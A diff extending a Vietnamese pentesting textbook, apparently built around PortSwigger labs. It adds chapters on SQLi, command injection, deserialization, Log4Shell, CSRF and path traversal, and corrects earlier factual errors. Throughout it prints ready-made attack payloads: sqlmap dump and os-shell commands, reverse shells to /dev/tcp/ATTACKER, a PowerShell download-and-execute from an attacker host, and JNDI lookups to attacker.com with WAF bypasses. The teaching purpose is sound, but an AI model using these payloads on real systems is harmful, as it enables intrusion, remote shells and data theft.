@@ -71,6 +71,19 @@
 - [F. Python Script Templates](#f-python-script-templates)
 - [G. PortSwigger Lab Progression Guide](#g-portswigger-lab-progression-guide)
 
+## QUYỂN 7: MỞ RỘNG NGOÀI PORTSWIGGER — THỰC CHIẾN THỰC TẾ
+- [Chương 39: .NET Deserialization](#chương-39-net-deserialization--mảnh-ghép-bị-thiếu)
+- [Chương 40: Blind XSS](#chương-40-blind-xss--kỹ-thuật-bị-thiếu-trong-portswigger)
+- [Chương 41: Trusted Types](#chương-41-trusted-types--tương-lai-phòng-chống-dom-xss)
+- [Chương 42: Fetch Metadata Headers](#chương-42-fetch-metadata-headers--server-side-defense-hiện-đại)
+- [Chương 43: Real-World CVE Case Studies](#chương-43-real-world-cve-case-studies)
+- [Chương 44: LDAP Injection](#chương-44-ldap-injection--lỗ-hổng-enterprise-bị-bỏ-quên)
+- [Chương 45: Modern Browser Security — COOP, COEP, CORP](#chương-45-modern-browser-security--coop-coep-corp)
+- [Chương 46: Supply Chain Security & CI/CD Attacks](#chương-46-supply-chain-security--cicd-attacks)
+- [Chương 47: Tool Arsenal](#chương-47-tool-arsenal--công-cụ-pentester-thực-tế)
+- [H. Bảng Tham Chiếu CVE Quan Trọng](#h-bảng-tham-chiếu-cve-quan-trọng)
+- [I. OWASP API Security Top 10 (2023)](#i-owasp-api-security-top-10-2023--quick-reference)
+
 ---
 
 # ═══════════════════════════════════════════════════
@@ -965,11 +978,21 @@ Phân tích:
     → userinfo = good.com%23, host = evil.com
     → Truy cập evil.com!
 
-Ví dụ thực tế (CVE-2023-xxxxx pattern):
+Ví dụ thực tế:
+  CVE-2023-24329 (Python urllib): urlparse() treat URLs bắt đầu bằng
+  blank characters (spaces, tabs) là relative path → bypass scheme check.
+  CVE-2022-29885 (Apache Tomcat): URL parsing inconsistency.
+  Orange Tsai's "A New Era of SSRF" (BlackHat 2017): chain URL parser
+  differentials giữa curl, wget, Java, PHP, Python, Node.js.
+
   SSRF filter: "URL phải trỏ tới good.com"
   Input: https://good.com%23@evil.com/
-  Filter thấy: host = good.com → pass
-  HTTP library thấy: host = evil.com → request đi evil.com
+  Filter (RFC 3986 parser) thấy: host = good.com → pass
+  HTTP library (WHATWG parser) thấy: host = evil.com → request đi evil.com
+
+  Lưu ý: RFC 3986 là syntax spec (nói cách format URL),
+  WHATWG URL Standard là parsing algorithm (nói cách parse URL).
+  Sự khác biệt giữa hai chuẩn này là ROOT CAUSE của mọi URL confusion attack.
 ```
 
 **Null byte truncation:**
@@ -2537,7 +2560,7 @@ Trong quyển này, ta sẽ đi từ SQL Injection (lỗ hổng kinh điển nh�
 
 > *"Give me a single quote and I shall move the database."*
 
-SQL Injection (SQLi) là lỗ hổng bảo mật web lâu đời nhất, nguy hiểm nhất, và vẫn phổ biến nhất. OWASP liên tục xếp Injection ở vị trí #1 trong suốt hơn một thập kỷ. Một lỗi SQLi duy nhất có thể dẫn đến: đánh cắp toàn bộ database, bypass authentication, đọc/ghi file trên server, và thậm chí Remote Code Execution.
+SQL Injection (SQLi) là lỗ hổng bảo mật web lâu đời nhất và nguy hiểm nhất. OWASP xếp Injection ở vị trí #1 suốt hơn một thập kỷ (Top 10 2013, 2017), và trong bản 2021 nó vẫn ở **#3 (A03:2021-Injection)** — chỉ sau Broken Access Control (#1) và Cryptographic Failures (#2). Dù "tụt hạng", SQLi vẫn là vector tấn công phổ biến nhất trong thực tế. Một lỗi SQLi duy nhất có thể dẫn đến: đánh cắp toàn bộ database, bypass authentication, đọc/ghi file trên server, và thậm chí Remote Code Execution. Các CVE thực tế gần đây: CVE-2023-34362 (MOVEit Transfer — SQLi dẫn đến data breach hàng loạt), CVE-2023-41892 (Craft CMS — SQLi to RCE).
 
 ---
 
@@ -4113,6 +4136,142 @@ WAF KHÔNG phải giải pháp chính. WAF là **tầng phòng thủ bổ sung**
 - Oracle: nhớ `FROM dual`
 - MSSQL: `TOP 1` thay vì `LIMIT 1`
 
+### 6.EXTRA: Mở Rộng Ngoài PortSwigger — Real-World SQLi
+
+#### SQLMap — Công cụ khai thác SQLi tự động
+
+```
+# Cơ bản
+sqlmap -u "https://target.com/page?id=1" --dbs
+sqlmap -u "https://target.com/page?id=1" -D dbname --tables
+sqlmap -u "https://target.com/page?id=1" -D dbname -T users --dump
+
+# POST request với cookie
+sqlmap -u "https://target.com/api" --data="user=admin&pass=test" \
+  --cookie="session=abc123" -p user
+
+# Từ Burp request file
+sqlmap -r request.txt --batch --risk=3 --level=5
+
+# Tamper scripts (WAF bypass)
+sqlmap -u "URL" --tamper=space2comment,between,randomcase
+# Tamper chains phổ biến:
+#   space2comment     : thay space bằng /**/
+#   between           : BETWEEN thay cho > <
+#   randomcase        : rAnDoM cAsE
+#   charunicodeencode : Unicode encode
+#   equaltolike       : = thay bằng LIKE
+
+# OS shell (nếu có FILE privilege)
+sqlmap -u "URL" --os-shell
+sqlmap -u "URL" --file-read="/etc/passwd"
+sqlmap -u "URL" --file-write="shell.php" --file-dest="/var/www/shell.php"
+
+# Second-order SQLi
+sqlmap -u "https://target.com/register" --data="user=payload" \
+  --second-url="https://target.com/profile" --second-req=profile.txt
+```
+
+#### ORM-specific Injection (Real-world phổ biến hơn raw SQL)
+
+```python
+# Django — QuerySet .extra() và .raw() là NGUY HIỂM
+# NGUY HIỂM:
+User.objects.extra(where=["name='%s'" % user_input])
+User.objects.raw("SELECT * FROM users WHERE name = '%s'" % user_input)
+# AN TOÀN:
+User.objects.filter(name=user_input)
+User.objects.raw("SELECT * FROM users WHERE name = %s", [user_input])
+
+# Django JSONField SQLi (CVE-2019-14234):
+# GET /api/users/?field__key=value' OR 1=1--
+# Django translate .filter(field__key=...) thành SQL JSON operator
+```
+
+```ruby
+# Rails — where() với string interpolation là NGUY HIỂM
+# NGUY HIỂM:
+User.where("name = '#{params[:name]}'")
+# AN TOÀN:
+User.where(name: params[:name])
+User.where("name = ?", params[:name])
+```
+
+```python
+# SQLAlchemy — text() cần bind parameters
+# NGUY HIỂM:
+db.execute(text(f"SELECT * FROM users WHERE id = {user_id}"))
+# AN TOÀN:
+db.execute(text("SELECT * FROM users WHERE id = :id"), {"id": user_id})
+```
+
+#### INSERT/UPDATE/DELETE Injection
+
+```sql
+-- INSERT injection (ví dụ: form đăng ký user)
+INSERT INTO users (username, email, role) VALUES ('attacker', 'a@b.com', 'user')
+-- Inject vào email: a@b.com', 'admin')-- -
+-- Kết quả: INSERT INTO users (username, email, role) VALUES ('attacker', 'a@b.com', 'admin')-- -', 'user')
+
+-- UPDATE injection (ví dụ: trang profile)
+UPDATE users SET email='newemail' WHERE id=123
+-- Inject vào email: newemail', role='admin' WHERE id=123-- -
+-- Kết quả: UPDATE users SET email='newemail', role='admin' WHERE id=123-- -' WHERE id=123
+
+-- DELETE injection
+DELETE FROM comments WHERE id=5 AND user_id=123
+-- Inject: 5 OR 1=1-- -
+-- Kết quả: DELETE FROM comments WHERE id=5 OR 1=1-- - → XÓA HẾT!
+```
+
+#### Database-specific RCE Chains
+
+```sql
+-- PostgreSQL: COPY TO/FROM PROGRAM (9.3+) — CVE-2019-9193
+-- Đọc file:
+CREATE TABLE cmd_output(line TEXT);
+COPY cmd_output FROM PROGRAM 'id';
+SELECT * FROM cmd_output;
+-- Reverse shell:
+COPY cmd_output FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"';
+
+-- MySQL: UDF (User-Defined Function) cho RCE
+-- 1. Tìm plugin directory: SELECT @@plugin_dir;
+-- 2. Upload shared library (.so/.dll) qua SELECT ... INTO DUMPFILE
+-- 3. CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
+-- 4. SELECT sys_exec('id');
+
+-- MySQL: LOAD DATA LOCAL INFILE (đọc file từ CLIENT, không phải server!)
+LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE test;
+
+-- Oracle: DBMS_SCHEDULER
+BEGIN
+  DBMS_SCHEDULER.CREATE_JOB(
+    job_name => 'PWNED',
+    job_type => 'EXECUTABLE',
+    job_action => '/bin/bash',
+    number_of_arguments => 2,
+    enabled => FALSE
+  );
+  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('PWNED', 1, '-c');
+  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('PWNED', 2, 'id > /tmp/out');
+  DBMS_SCHEDULER.ENABLE('PWNED');
+END;
+
+-- SQLite: load_extension()
+-- Nếu không bị disable: SELECT load_extension('/tmp/evil.so');
+```
+
+#### SQL Truncation Attack
+
+```
+-- Khi column có giới hạn (e.g., VARCHAR(20)):
+-- Tạo user: "admin               x" (admin + 15 spaces + x)
+-- Database truncate tại 20 chars → "admin               " (admin + 15 spaces)
+-- Trailing spaces bị trim → so sánh với "admin" → DUPLICATE admin account!
+-- CVE liên quan: WordPress username collision via truncation
+```
+
 ---
 
 ## Chương 7: OS Command Injection
@@ -4222,9 +4381,23 @@ if (pid == 0) {
 **system() -- VULNERABLE:**
 
 ```c
-// C code
-system("ping -c 4 " + user_input);
+// C code (LƯU Ý: C KHÔNG concatenate strings bằng operator +)
+// Cách đúng trong C:
+char cmd[256];
+snprintf(cmd, sizeof(cmd), "ping -c 4 %s", user_input);
+system(cmd);
 // Internally: execve("/bin/sh", ["sh", "-c", "ping -c 4 USER_INPUT"], environ);
+
+// Python equivalent (dễ gặp hơn trong thực tế):
+import os
+os.system("ping -c 4 " + user_input)
+
+// Node.js:
+const { exec } = require('child_process');
+exec("ping -c 4 " + user_input);  // NGUY HIỂM
+// vs exec vs execFile:
+// exec()  → gọi shell → NGUY HIỂM (tương đương system())
+// execFile() → gọi trực tiếp binary → AN TOÀN hơn (không qua shell)
 ```
 
 `system()` luôn gọi `/bin/sh -c "command string"`. Shell nhận **toàn bộ string** và parse nó -- bao gồm metacharacters.
@@ -4755,6 +4928,65 @@ if not re.match(r'^[a-zA-Z0-9][a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', domain):
 - Dùng command substitution: `` `command` `` hoặc `$(command)`
 - Dùng bypass techniques từ phần 7.6
 
+### 7.EXTRA: Mở Rộng Ngoài PortSwigger
+
+#### Windows Command Injection (cmd.exe vs PowerShell)
+
+PortSwigger labs chỉ cover Linux. Thực tế nhiều target chạy Windows:
+
+```
+=== cmd.exe (Command Prompt) ===
+Metacharacters: & && | || ( ) < > ^ %
+Ví dụ: ping 127.0.0.1 & whoami
+       ping 127.0.0.1 | net user
+
+Biến môi trường: %USERNAME%, %COMPUTERNAME%, %USERDOMAIN%
+Bypass space: ping%PROGRAMFILES:~10,-5%127.0.0.1
+  (%PROGRAMFILES% = "C:\Program Files" → ký tự thứ 10 = space)
+
+Delayed expansion: !var! (khi ENABLEDELAYEDEXPANSION được bật)
+
+FOR /F bypass: for /f %i in ('whoami') do echo %i
+
+=== PowerShell ===
+Metacharacters: ; | & ( ) $( )
+Ví dụ: ping 127.0.0.1; whoami
+       ping 127.0.0.1 | Invoke-Expression "whoami"
+
+Invoke-Expression: IEX (New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')
+& operator: & cmd /c whoami
+Subexpression: $(whoami)
+Encoded command: powershell -enc [BASE64_UTF16LE]
+  ⚠️ -enc/-EncodedCommand expects UTF-16LE base64, NOT ASCII/UTF-8!
+  Tạo: echo -n "whoami" | iconv -t UTF-16LE | base64
+```
+
+#### Shellshock (CVE-2014-6271)
+
+```bash
+# Bash function export parsing flaw — bất kỳ process nào fork bash đều bị
+# Payload trong environment variable:
+env x='() { :; }; echo VULNERABLE' bash -c "echo test"
+
+# Khai thác qua CGI (web server fork bash cho mỗi CGI request):
+curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1" \
+  http://target.com/cgi-bin/script.sh
+
+# Các biến thể (CVE-2014-7169, CVE-2014-6277, CVE-2014-6278):
+env x='() { _; } >_[$($())] { echo VULN; }' bash -c "echo test"
+```
+
+#### Environment Variable Injection
+
+```
+# Khi attacker kiểm soát environment variables:
+LD_PRELOAD=/tmp/evil.so     → Linux shared library hijacking
+PYTHONPATH=/tmp/evil         → Python module hijacking
+NODE_OPTIONS="--require /tmp/evil.js"  → Node.js code injection
+PERL5OPT=-e "system('id')"  → Perl code execution
+BASH_ENV=/tmp/evil.sh        → Bash script execution on startup
+```
+
 ---
 
 ## Chương 8: Server-Side Template Injection (SSTI)
@@ -5058,7 +5290,11 @@ Input: {{7*7}}
 │
 └── Output: {{7*7}} (literal, không evaluate)
     └── Thử: ${7*7}, #{7*7}, <% %>, ${{7*7}}
-        └── ${{7*7}} = 49? → PEBBLE (Java) hoặc HANDLEBARS
+        └── ${{7*7}} = 49? → PEBBLE (Java)
+            ⚠️ KHÔNG phải Handlebars! Handlebars là logic-less template,
+            {{7*7}} chỉ lookup variable tên "7*7", KHÔNG evaluate expression.
+        └── Thử thêm: <% 7*7 %> = 49? → MAKO (Python) — thường bị bỏ sót!
+            Mako rất phổ biến (Reddit, Pylons): <% import os; os.system("id") %>
 ```
 
 **Bảng tóm tắt syntax:**
@@ -5878,10 +6114,27 @@ Nếu error message hiển thị, password xuất hiện trong error.
 **DNS exfiltration (nếu server cho phép outbound connections):**
 
 ```json
-{"$where": "function(){var x=new XMLHttpRequest();x.open('GET','http://attacker.com/'+this.password);x.send();return true;}"}
+⚠️ LƯU Ý QUAN TRỌNG: XMLHttpRequest KHÔNG tồn tại trong MongoDB server-side
+JavaScript engine (SpiderMonkey). MongoDB JS context bị giới hạn nghiêm ngặt,
+KHÔNG có XMLHttpRequest, fetch, hay bất kỳ network API nào.
+
+Thay vào đó, dùng DNS exfiltration qua function name trick (nếu server cho phép DNS):
+{"$where": "function(){var p=this.password;var d=p+'.attacker.com';return true;}"}
+
+Hoặc time-based extraction:
+{"$where": "function(){if(this.password.charAt(0)=='a'){sleep(5000)}return true;}"}
 ```
 
-Lưu ý: `$where` bị disable mặc định trong MongoDB 4.4+ với `--noscripting`. Nhiều deployments vẫn cho phép.
+⚠️ Lưu ý quan trọng: `$where` KHÔNG bị disable mặc định. Flag `--noscripting`
+phải được set EXPLICITLY khi khởi động mongod. Trong MongoDB 4.4+, `$where`
+vẫn hoạt động bình thường trừ khi admin chủ động bật `--noscripting`.
+Tuy nhiên, MongoDB 4.4+ khuyến khích dùng `$expr` + aggregation operators
+thay cho `$where` vì performance tốt hơn và an toàn hơn.
+
+Các vector thay thế cho `$where` trong MongoDB 4.4+:
+- `$function` (server-side JS, thay thế $where): {"$expr": {"$function": {body: "...", args: [...], lang: "js"}}}
+- `$accumulator` (trong aggregation pipeline)
+- `mapReduce` (đang deprecated nhưng nhiều app vẫn dùng)
 
 ---
 
@@ -7765,7 +8018,11 @@ Lab: JWT authentication bypass via kid header path traversal
 ─────────────────────────────────────────────────
 1. Sửa header: kid = "../../../dev/null", alg = "HS256"
 2. Sửa payload: sub = "administrator"
-3. Sign bằng empty string (AA== base64 của null byte, hoặc empty string)
+3. Sign bằng key phù hợp:
+   - AA== = base64 của single null byte (0x00) — KHÔNG PHẢI empty string
+   - Empty string base64 = "" (literally empty, không có ký tự nào)
+   - Hai giá trị này tạo ra HMAC signatures KHÁC NHAU
+   - Thử cả hai: empty string VÀ null byte (AA==)
 4. Thử cả: empty string, null byte, "\n" cho symmetric key
 
 Lab: Algorithm confusion attack
@@ -8007,7 +8264,16 @@ Sau khi user consent, redirect:
 6. Fragment (#) không gửi lên server, nhưng JavaScript trên page có thể đọc
    → XSS trên callback page = steal token ngay lập tức
 
-OAuth 2.1 (draft) đã chính thức loại bỏ Implicit Flow.
+OAuth 2.1 (vẫn đang là DRAFT, chưa được ratified chính thức tính đến 2025)
+dự kiến loại bỏ Implicit Flow. Tuy nhiên, hầu hết identity providers
+đã ngừng khuyến nghị Implicit Flow trước khi 2.1 được hoàn thiện.
+
+Lưu ý: Implicit Flow token nằm trong URL **fragment** (#access_token=...),
+KHÔNG phải query string. Fragment KHÔNG được gửi trong Referer header
+và KHÔNG lưu trong browser history. Rủi ro thực sự là:
+- JavaScript trên page đọc location.hash (XSS = steal token ngay)
+- history.pushState() có thể di chuyển fragment vào path
+- Proxy logs KHÔNG capture được fragment (khó detect).
 ```
 
 #### PKCE (Proof Key for Code Exchange)
@@ -11140,6 +11406,60 @@ fetch('/api/transfer', {
 - Check SameSite: xem cookie có SameSite attribute không
 - Method override: thử `_method`, X-HTTP-Method-Override
 - Referer: thử suppress với `<meta name="referrer" content="no-referrer">`
+
+### 15.EXTRA: Mở Rộng Ngoài PortSwigger — CSRF Real-World
+
+#### Login CSRF — Biến Thể Ít Được Biết
+
+```
+Login CSRF: ép victim đăng nhập vào TÀI KHOẢN CỦA ATTACKER.
+Khác với CSRF thông thường — không steal victim's data trực tiếp,
+mà theo dõi victim's activity trong attacker's account.
+
+Attack flow:
+1. Attacker có CSRF trên /login endpoint
+2. Victim truy cập trang attacker → form tự submit login với creds của attacker
+3. Victim giờ đã đăng nhập bằng tài khoản attacker mà KHÔNG BIẾT
+4. Victim thêm credit card, upload files, nhập search queries...
+5. Attacker đăng nhập lại → thấy tất cả activity của victim
+
+Ví dụ thực tế:
+- Google Login CSRF (2008): victim search history lưu trong attacker's account
+- PayPal Login CSRF: victim link credit card vào attacker's PayPal
+
+Defense: Login endpoint CŨNG CẦN CSRF protection!
+```
+
+#### SameSite Bypass via Sibling Subdomain XSS
+
+```
+SameSite=Lax KHÔNG bảo vệ nếu attacker có XSS trên BẤT KỲ subdomain nào
+trong cùng eTLD+1 (registrable domain).
+
+Ví dụ:
+- Target: bank.example.com (SameSite=Lax cookies)
+- Attacker tìm XSS trên: blog.example.com
+
+blog.example.com XSS gửi request tới bank.example.com:
+  → SameSite check: blog.example.com & bank.example.com = SAME-SITE!
+  → Cookies được gửi → CSRF thành công!
+
+Bài học: SameSite protection yêu cầu security trên TOÀN BỘ subdomains,
+không chỉ main domain.
+```
+
+#### Cookie Tossing
+
+```
+Attacker control subdomain (evil.example.com) → set cookie cho parent domain:
+  Set-Cookie: csrf_token=ATTACKER_VALUE; Domain=.example.com; Path=/
+
+→ Override legitimate csrf_token trên main.example.com
+→ Double-submit cookie pattern bị bypass!
+
+Attack: attacker biết csrf_token (vì chính họ set)
+→ form gửi csrf_token=ATTACKER_VALUE (match cookie) → CSRF pass!
+```
 
 ---
 
@@ -14376,9 +14696,18 @@ libxml_disable_entity_loader(true);  // PHP < 8.0
 $dom = new DOMDocument();
 $dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);  // ĐỪNG!
 
+// ⚠️ CẢNH BÁO VỀ LIBXML_NOENT:
+// Tên LIBXML_NOENT rất dễ gây hiểu lầm!
+// LIBXML_NOENT = 2 nghĩa là "substitute entity references" (ENABLE entity substitution)
+// KHÔNG PHẢI "no entities" như tên gợi ý!
+// Dùng LIBXML_NOENT mà KHÔNG disable external entity loading = KHÔNG AN TOÀN
+
+// SAI (vẫn nguy hiểm - LIBXML_NONET chỉ block network, LIBXML_NOENT enable substitution):
+$dom->loadXML($xml, LIBXML_NONET | LIBXML_NOENT);  // ← VẪN XỬ LÝ file:// entities!
+
 // ĐÚNG: Disable DTD loading hoàn toàn (an toàn nhất)
-$dom->loadXML($xml, LIBXML_NONET | LIBXML_NOENT);
-// LƯU Ý: LIBXML_NONET chỉ block network, KHÔNG chặn file:///
+$dom->loadXML($xml, LIBXML_NONET);  // Không dùng LIBXML_NOENT
+// HOẶC tốt hơn: không dùng bất kỳ flag nào cho untrusted XML
 // PHP 8.0+ với libxml2 >= 2.9.0: external entities disabled by default
 // PHP < 8.0: BẮT BUỘC gọi libxml_disable_entity_loader(true)
 ```
@@ -15709,6 +16038,34 @@ Developing a custom gadget chain for      │ Build POP chain manually
   Java/PHP deserialization               │   from application classes
 ```
 
+### 24.EXTRA: Mở Rộng — .NET Deserialization & JSON Deserialization
+
+**Xem chi tiết tại Chương 39 (Quyển 7: Mở Rộng Ngoài PortSwigger)**
+
+Quick reference các attack surface bị thiếu trong PortSwigger:
+
+```
+.NET Deserialization:
+  - BinaryFormatter (AC ED tương đương trong .NET)
+  - ViewState (ASP.NET Web Forms hidden field) — CVE-2020-0688
+  - ObjectStateFormatter, LosFormatter, SoapFormatter
+  - Tool: ysoserial.net (tương đương ysoserial cho Java)
+
+JSON Deserialization (KHÔNG phải traditional serialization nhưng cùng impact):
+  - Jackson enableDefaultTyping() → JNDI → RCE
+  - FastJSON auto-type → JNDI → RCE
+  - Newtonsoft TypeNameHandling.Auto → Process.Start → RCE
+
+JNDI Injection (Log4Shell — CVE-2021-44228):
+  - ${jndi:ldap://attacker/evil} trong bất kỳ logged input
+  - Affected HÀNG TRIỆU servers
+  - Xem Chương 39.5 cho chi tiết
+
+Python Pickle trong ML/AI:
+  - .pkl, .pt (PyTorch) files → RCE khi load
+  - AI model files trên Hugging Face = tiềm ẩn pickle RCE
+  - Tool: Fickling (analysis), ModelScan (detection)
+```
 
 ---
 
@@ -16785,7 +17142,8 @@ Host: evil.com
 # Component        │ Dùng header nào?
 # ─────────────────┼─────────────────
 # Apache httpd     │ REJECT (400 Bad Request)
-# Nginx            │ LAST header (evil.com)
+# Nginx (modern)   │ REJECT (400 Bad Request) — since 0.7.0+
+#                  │ ⚠️ Bảng cũ ghi "LAST header" là SAI cho Nginx hiện đại
 # IIS              │ FIRST header (legitimate.com)
 # Node.js/Express  │ FIRST header (legitimate.com)
 # Python/Flask     │ LAST header (evil.com)
@@ -17060,10 +17418,23 @@ Mỗi CDN có cách xây dựng cache key khác nhau:
 ```
 ─── Cloudflare ──────────────────────────────────────────────
 Cache Key mặc định:
-  SCHEME | HOST | PATH | SORTED_QUERY_STRING
+  SCHEME | HOST | PATH | QUERY_STRING
 
-Ví dụ: GET https://example.com/page?b=2&a=1
-Key:    https|example.com|/page|a=1&b=2    (query sorted!)
+⚠️ QUAN TRỌNG: Cloudflare KHÔNG sort query string mặc định!
+Sort chỉ xảy ra khi admin bật "Sort Query String" trong Page Rules
+hoặc Cache Rules. Mặc định query string giữ nguyên thứ tự.
+
+Ví dụ (mặc định, KHÔNG sort):
+  GET https://example.com/page?b=2&a=1
+  Key: https|example.com|/page|b=2&a=1    (giữ nguyên thứ tự!)
+
+Ví dụ (khi bật Sort Query String):
+  GET https://example.com/page?b=2&a=1
+  Key: https|example.com|/page|a=1&b=2    (đã sort)
+
+Sự khác biệt này QUAN TRỌNG cho cache poisoning:
+  - Nếu KHÔNG sort: ?a=1&b=2 và ?b=2&a=1 là HAI cache entries khác nhau
+  - Nếu sort: chúng là MỘT entry → khó poison hơn
 
 Cloudflare KHÔNG include trong key (mặc định):
   - Request headers (X-Forwarded-Host, Accept-Language, v.v.)
@@ -19672,12 +20043,23 @@ Technique               │ Payload                    │ Decoded
 URL encoding            │ %2e%2e%2f                  │ ../
 Double URL encoding     │ %252e%252e%252f            │ %2e%2e%2f → ../
 Overlong UTF-8          │ %c0%ae%c0%ae%c0%af         │ ../
+  ⚠️ LEGACY ONLY: Không hoạt động trên bất kỳ web server/framework hiện đại nào
+  (Apache 2.0+, IIS 6+, modern PHP, Python, Node.js). Chỉ có giá trị lịch sử.
+  Tuy nhiên, vẫn có thể hoạt động trên embedded systems, IoT devices, custom parsers.
                         │ %c0%2e%c0%2e%c0%af         │ 
 16-bit Unicode          │ %u002e%u002e%u002f         │ ../
+  ⚠️ Chỉ hoạt động trên IIS 5.x/6.x. Modern IIS reject.
 Mixed encoding          │ ..%252f                    │ ..%2f → ../
 HTML entity             │ &#46;&#46;/                │ ../
-Overlong UTF-8 (dot)    │ %c0%ae = . (2-byte)       │ .
-                        │ %e0%80%ae = . (3-byte)    │ .
+Overlong UTF-8 (dot)    │ %c0%ae = . (2-byte)       │ .  [LEGACY]
+                        │ %e0%80%ae = . (3-byte)    │ .  [LEGACY]
+
+MODERN PATH TRAVERSAL (vẫn hoạt động 2024+):
+  Apache 2.4.49-50      │ /.%2e/                     │ CVE-2021-41773, CVE-2021-42013
+  Tomcat/Spring          │ /..;/                      │ Semicolon bypass
+  Nginx alias            │ /images../etc/passwd       │ Off-by-slash (missing trailing /)
+  Pulse Secure           │ /dana-na/../               │ CVE-2019-11510
+  F5 BIG-IP              │ /tmui/login.jsp/..;/       │ CVE-2020-5902
 ```
 
 **Double encoding explained:**
@@ -26060,4 +26442,762 @@ Kỹ thuật: Business logic analysis, cache key analysis, unkeyed input detecti
 ---
 
 # KẾT THÚC QUYỂN 6 & PHỤ LỤC
+
+---
+
+# ═══════════════════════════════════════════════════
+# QUYỂN 7: MỞ RỘNG NGOÀI PORTSWIGGER — THỰC CHIẾN THỰC TẾ
+# ═══════════════════════════════════════════════════
+
+> **Triết lý:** PortSwigger dạy nền tảng tuyệt vời, nhưng thế giới thực rộng hơn nhiều.
+> Quyển này bổ sung những gì PortSwigger KHÔNG cover nhưng pentester thực tế BẮT BUỘC phải biết.
+
+---
+
+## Chương 39: .NET Deserialization — Mảnh Ghép Bị Thiếu
+
+### 39.1 Tại sao quan trọng?
+
+.NET deserialization là một trong những attack surface phổ biến nhất trong enterprise:
+- ViewState (ASP.NET Web Forms) — vẫn còn HÀNG TRIỆU ứng dụng legacy
+- BinaryFormatter — Microsoft đã deprecated nhưng vẫn tồn tại khắp nơi
+- JSON.NET (Newtonsoft) TypeNameHandling — phổ biến trong API .NET
+
+### 39.2 ViewState Exploitation
+
+```
+ViewState là serialized object lưu trong hidden field HTML:
+<input type="hidden" name="__VIEWSTATE" value="..." />
+
+ASP.NET ViewState flow:
+1. Server serialize page state → Base64 → hidden field
+2. Client gửi lại ViewState trong POST
+3. Server deserialize → khôi phục page state
+
+Nếu ViewState KHÔNG được mã hóa (enableViewStateMac = false):
+→ Attacker thay thế bằng malicious serialized object
+→ Server deserialize → RCE
+
+Nếu ViewState CÓ MAC nhưng bạn biết machineKey:
+→ ysoserial.net tạo payload signed với machineKey
+→ machineKey thường leak qua: web.config exposure, LFI, info disclosure
+```
+
+### 39.3 ysoserial.net — Công cụ khai thác .NET deserialization
+
+```
+# Tạo payload cho BinaryFormatter
+ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe" -o base64
+
+# Tạo ViewState payload (cần machineKey)
+ysoserial.net -p ViewState -g TextFormattingRunProperties \
+  --validationalg="SHA1" \
+  --validationkey="KEY_HEX" \
+  --generator="GENERATOR" \
+  --path="/target.aspx" \
+  -c "powershell -enc BASE64"
+
+# Gadget chains phổ biến:
+# TypeConfuseDelegate    — BinaryFormatter, NetDataContractSerializer
+# TextFormattingRunProperties — ObjectDataProvider chain
+# ActivitySurrogateSelector  — BinaryFormatter (4.5+)
+# PSObject               — PowerShell-specific
+
+CVE thực tế:
+- CVE-2020-0688: Microsoft Exchange ViewState RCE (hardcoded machineKey!)
+- CVE-2019-18935: Telerik UI for ASP.NET AJAX deserialization RCE
+```
+
+### 39.4 JSON Deserialization (Jackson, FastJSON, Newtonsoft)
+
+```java
+// Java — Jackson enableDefaultTyping() cho phép polymorphic deserialization
+ObjectMapper mapper = new ObjectMapper();
+mapper.enableDefaultTyping();  // NGUY HIỂM!
+// Attacker gửi: {"@class":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/evil"}
+// → JNDI lookup → RCE
+
+// CVE-2017-7525: Jackson databind RCE via TemplatesImpl
+// CVE-2019-12384: Jackson databind via H2 database JDBC URL
+```
+
+```csharp
+// C# — Newtonsoft JSON.NET TypeNameHandling
+var settings = new JsonSerializerSettings {
+    TypeNameHandling = TypeNameHandling.Auto  // NGUY HIỂM!
+};
+var obj = JsonConvert.DeserializeObject(userInput, settings);
+// Attacker gửi: {"$type":"System.Windows.Data.ObjectDataProvider, ...","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, ..."}}
+```
+
+```java
+// Java — FastJSON auto-type (phổ biến ở Trung Quốc)
+// CVE-2022-25845: FastJSON < 1.2.83 RCE
+JSON.parseObject(userInput);  // auto-type enabled by default trước 1.2.68
+// Payload: {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/evil"}
+```
+
+### 39.5 JNDI Injection & Log4Shell (CVE-2021-44228)
+
+```
+Log4Shell — "The vulnerability heard around the world"
+
+Root cause: Log4j 2.x (Java logging library) tự động resolve JNDI lookups
+trong log messages:
+  logger.info("User login: " + userInput);
+  Nếu userInput = "${jndi:ldap://attacker.com/evil}" → Log4j resolve JNDI URL!
+
+Attack chain:
+  1. Attacker gửi: ${jndi:ldap://attacker.com/evil}
+     (trong User-Agent, X-Forwarded-For, form field, bất kỳ đâu được log)
+  2. Log4j parse ${jndi:...} → JNDI lookup tới attacker LDAP server
+  3. LDAP server trả về Reference pointing to http://attacker.com/Evil.class
+  4. Java download Evil.class → instantiate → static initializer chạy → RCE
+
+Bypass WAF:
+  ${${lower:j}ndi:${lower:l}dap://attacker.com/evil}
+  ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/evil}
+  ${jndi:dns://attacker.com/evil}  (DNS exfil khi LDAP bị block)
+
+Detection:
+  - Chuỗi chứa ${jndi: trong logs
+  - DNS queries bất thường đến domains lạ
+  - Outbound LDAP/RMI connections
+
+Scope: BẰNG MỌI THỨ có dùng Log4j 2.x (2.0 đến 2.17.0):
+  - Web servers, API gateways, Minecraft servers, Elasticsearch, VMware, Apple iCloud,
+    Twitter, Cloudflare, Steam, Amazon, ...
+```
+
+---
+
+## Chương 40: Blind XSS — Kỹ Thuật Bị Thiếu Trong PortSwigger
+
+### 40.1 Khái niệm
+
+```
+Blind XSS = Stored XSS mà attacker KHÔNG THẤY output trực tiếp.
+Payload trigger ở một context khác — thường là admin panel, internal tool,
+logging dashboard, email client, hoặc report viewer.
+
